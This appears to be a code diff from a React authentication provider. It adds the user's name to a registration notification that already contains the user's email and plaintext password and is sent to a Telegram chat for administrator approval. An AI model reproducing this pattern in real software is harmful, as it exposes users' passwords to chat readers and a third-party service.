@@ -765,7 +765,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         return false;
       }
       
-      const message = `🔔 New registration request\n\n📧 Email: ${credentials.email}\n🔑 Password: ${credentials.password}\n📅 Date: ${new Date().toLocaleDateString('en-US')}, ${new Date().toLocaleTimeString('en-US')}\n\n⏳ Awaiting administrator approval`;
+      const message = `🔔 New registration request\n\n👤 Name: ${credentials.name}\n📧 Email: ${credentials.email}\n🔑 Password: ${credentials.password}\n📅 Date: ${new Date().toLocaleDateString('en-US')}, ${new Date().toLocaleTimeString('en-US')}\n\n⏳ Awaiting administrator approval`;
       await sendTelegramNotification(message);
       
       setIsLoading(false);
